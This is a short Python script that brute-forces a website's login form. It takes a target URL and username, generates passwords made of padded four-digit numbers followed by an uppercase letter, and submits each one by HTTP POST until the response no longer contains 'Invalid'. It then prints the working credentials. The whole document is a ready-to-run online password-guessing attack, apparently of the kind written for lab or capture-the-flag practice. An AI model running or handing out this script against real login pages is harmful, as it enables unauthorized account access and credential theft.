import requests
import string

url = input("Enter URL:")

username = input("Enter username:")

#generate numeric passwords
count = int(input("Enter digit count:"))

alphabet = list(string.ascii_uppercase)

#password_list = [str(i).zfill(count) for i in range(10000)]
password_list = [str(i).zfill(count) + letter for i in range(10000) for letter in alphabet]

def brute_force():
        for password in password_list:
                data = {"username": username, "password": password}
                response = requests.post(url, data=data)

                if "Invalid" not in response.text:
                        print(f" Found valid credentials: {username}:{password}")
                        break
                else:
                        print(f" Attempted: {password}")
brute_force()

